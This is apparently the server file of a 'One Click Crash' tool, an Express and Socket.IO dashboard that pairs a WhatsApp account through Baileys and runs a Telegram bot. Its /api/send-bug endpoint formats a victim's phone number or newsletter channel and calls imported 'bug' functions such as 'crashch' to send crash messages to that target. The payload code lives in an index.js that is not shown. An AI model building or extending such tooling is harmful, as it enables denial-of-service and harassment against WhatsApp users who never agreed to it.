// server.js
const express = require('express');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const chalk = require('chalk');
const exphbs = require('express-handlebars');
const { allowInsecurePrototypeAccess } = require('@handlebars/allow-prototype-access'); // For Handlebars security

// Import bot logic from index.js
const { bot, startSesi, setSocketIO, validateBotToken, Mikasa, bugCommands } = require('./index.js');
const config = require('./config.js'); // Import config for OWNER_TOKEN_KEY

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;

// Set Handlebars as the templating engine
const hbs = exphbs.create({
    extname: '.hbs',
    defaultLayout: 'main',
    layoutsDir: path.join(__dirname, 'views/layouts'),
    partialsDir: path.join(__dirname, 'views/partials'), // If you have partials
    handlebars: allowInsecurePrototypeAccess(require('handlebars')) // Required for newer Handlebars versions
});
app.engine('hbs', hbs.engine);
app.set('view engine', 'hbs');
app.set('views', path.join(__dirname, 'views'));

// Middleware to parse JSON and URL-encoded bodies
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// Middleware for owner authentication (using OWNER_TOKEN_KEY)
const authenticateOwner = (req, res, next) => {
    const token = req.headers['x-owner-token'] || req.body.ownerToken || req.query.ownerToken;
    if (token === config.OWNER_TOKEN_KEY) {
        next(); // Allow access
    } else {
        res.status(403).json({ error: 'Forbidden: Invalid owner token.' });
    }
};

// --- API Endpoints ---

// Endpoint for WhatsApp Pairing via web
app.post('/api/request-pairing', authenticateOwner, async (req, res) => {
    const { phoneNumber } = req.body;

    if (!phoneNumber) {
        return res.status(400).json({ error: 'Phone number is required.' });
    }

    // Sanitize phone number (remove non-digits, ensure correct format if needed)
    let cleanedPhoneNumber = phoneNumber.replace(/[^0-9]/g, "");
    if (!cleanedPhoneNumber.startsWith('62')) { // Assume Indonesian numbers
        cleanedPhoneNumber = '62' + cleanedPhoneNumber;
    }

    try {
        if (!Mikasa) {
            return res.status(500).json({ error: 'WhatsApp client is not initialized.' });
        }
        if (Mikasa && Mikasa.user) {
            return res.json({ status: 'info', message: 'WhatsApp is already connected. No new pairing needed.' });
        }

        // Trigger the Baileys pairing code request
        // The `connection.update` event in index.js will handle sending the QR/code via Socket.IO
        const code = await Mikasa.requestPairingCode(cleanedPhoneNumber, "MIKASAAA");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        // Emit code immediately to the client who requested it
        io.to(req.headers['x-socket-id']).emit('whatsapp-pairing-code', { phoneNumber: cleanedPhoneNumber, code: formattedCode });

        res.json({ status: 'success', message: 'Pairing process initiated. Check dashboard for code.', code: formattedCode });

    } catch (error) {
        console.error(chalk.red('Error in /api/request-pairing:'), error);
        io.to(req.headers['x-socket-id']).emit('whatsapp-pairing-error', { phoneNumber: cleanedPhoneNumber, error: 'Failed to initiate pairing. Ensure bot is running and ready.' });
        res.status(500).json({ error: 'Failed to initiate pairing. Ensure bot is running and ready.' });
    }
});

// Endpoint to trigger bug commands from web
app.post('/api/send-bug', authenticateOwner, async (req, res) => {
    const { command, target, ownerToken } = req.body;

    if (!command || !target || !ownerToken) {
        return res.status(400).json({ error: 'Command, target, and ownerToken are required.' });
    }

    if (ownerToken !== config.OWNER_TOKEN_KEY) {
        return res.status(403).json({ error: 'Forbidden: Invalid owner token.' });
    }

    let formattedTarget = target.replace(/[^0-9]/g, "");
    if (command !== 'crashch') { // Only convert to @s.whatsapp.net for non-channel bugs
        formattedTarget += "@s.whatsapp.net";
    } else { // For crashch, append @newsletter if it's not already there
        if (!formattedTarget.endsWith('@newsletter')) {
            formattedTarget += '@newsletter';
        }
    }


    if (!Mikasa || !Mikasa.user) {
        return res.status(503).json({ error: 'WhatsApp bot is not connected. Please pair first.' });
    }

    if (!bugCommands[command]) {
        return res.status(400).json({ error: `Invalid bug command: ${command}` });
    }

    try {
        io.emit('bug-progress', { status: 'started', command: command, target: target, message: `Sending ${command} bug to ${target}...` });
        await bugCommands[command](formattedTarget); // Call the bug function from index.js
        io.emit('bug-progress', { status: 'completed', command: command, target: target, message: `Successfully sent ${command} bug to ${target}!` });
        res.json({ status: 'success', message: `${command} bug sent to ${target}.` });
    } catch (error) {
        console.error(chalk.red(`Error sending bug command '${command}' to '${target}':`), error);
        io.emit('bug-progress', { status: 'error', command: command, target: target, message: `Failed to send ${command} bug to ${target}: ${error.message}` });
        res.status(500).json({ error: `Failed to send bug: ${error.message}` });
    }
});

// Endpoint to delete WhatsApp session
app.post('/api/delete-session', authenticateOwner, async (req, res) => {
    try {
        const { deleteSession } = require('./index.js'); // Dynamically require if not exported globally
        const success = deleteSession();
        if (success) {
            io.emit('whatsapp-status', { status: 'Session Deleted', message: 'WhatsApp session deleted. Please re-pair.' });
            res.json({ status: 'success', message: 'WhatsApp session deleted successfully.' });
        } else {
            res.status(404).json({ status: 'info', message: 'No WhatsApp session found to delete.' });
        }
    } catch (error) {
        console.error(chalk.red('Error deleting session:'), error);
        res.status(500).json({ error: 'Failed to delete session.' });
    }
});

// Endpoint to restart the bot process
app.post('/api/restart-bot', authenticateOwner, async (req, res) => {
    try {
        io.emit('bot-status', { status: 'restarting', message: 'Bot is restarting...' });
        res.json({ status: 'success', message: 'Bot restart initiated.' });
        console.log(chalk.yellow('Restarting bot process...'));
        setTimeout(() => { process.exit(0); }, 2000); // Give time for response
    } catch (error) {
        console.error(chalk.red('Error restarting bot:'), error);
        res.status(500).json({ error: 'Failed to restart bot.' });
    }
});

// --- Views/Routes ---

// Home route to render the dashboard
app.get('/', (req, res) => {
    // You can pass dynamic data to your Handlebars template here
    res.render('dashboard', {
        title: 'Mikasa Cloud - Bot Dashboard',
        currentYear: new Date().getFullYear(),
        // Potentially pass bot status, uptime, etc. if you make them accessible
    });
});

// Socket.IO connection handling
io.on('connection', (socket) => {
    console.log(chalk.green(`A user connected via WebSocket. Socket ID: ${socket.id}`));
    // Send the current WhatsApp connection status to the newly connected client
    socket.emit('whatsapp-status', { 
        status: Mikasa && Mikasa.user ? 'Successfully' : 'Disconnected',
        message: Mikasa && Mikasa.user ? 'WhatsApp connected!' : 'WhatsApp disconnected!',
        number: Mikasa && Mikasa.user ? Mikasa.user.id.split(':')[0] : 'N/A'
    });

    socket.on('disconnect', () => {
        console.log(chalk.red(`User disconnected from WebSocket. Socket ID: ${socket.id}`));
    });
});


// ********** Initialize Bot Logic **********
async function initializeBot() {
    console.clear();
    console.log(chalk.blue("Starting Mikasa Cloud Bot Dashboard Server..."));

    const tokenIsValid = await validateBotToken();
    if (!tokenIsValid) {
        console.log(chalk.red("Bot token is invalid. Exiting."));
        process.exit(1);
    }

    setSocketIO(io); // Pass the Socket.IO instance to index.js
    startSesi(); // Start WhatsApp session
    bot.launch(); // Launch Telegram bot

    console.log(chalk.bold.blue(` 
┏━━[ One Click Crash ]
┃ Developer : kepFoЯannas
┃ Versi     : 4.0 Remake
┃ Type      : Button
┗━━━━━━━━━━━━━━━━━━━━━❍
`));
    console.log(chalk.bold.green("✅ Bot Active Now !!!"));
    console.log(chalk.blue(`🚀 Server listening on http://localhost:${PORT}`));
    console.log(chalk.blue(`🌐 Web dashboard available at http://localhost:${PORT}`));
}

// Start the entire application
initializeBot();

// Enable graceful stop for Express and Telegraf bot
process.once('SIGINT', () => {
    console.log(chalk.yellow('SIGINT received. Shutting down gracefully...'));
    bot.stop('SIGINT');
    if (Mikasa) Mikasa.end(); // End Baileys connection
    server.close(() => {
        console.log(chalk.green('HTTP server closed.'));
        process.exit(0);
    });
});
process.once('SIGTERM', () => {
    console.log(chalk.yellow('SIGTERM received. Shutting down gracefully...'));
    bot.stop('SIGTERM');
    if (Mikasa) Mikasa.end(); // End Baileys connection
    server.close(() => {
        console.log(chalk.green('HTTP server closed.'));
        process.exit(0);
    });
});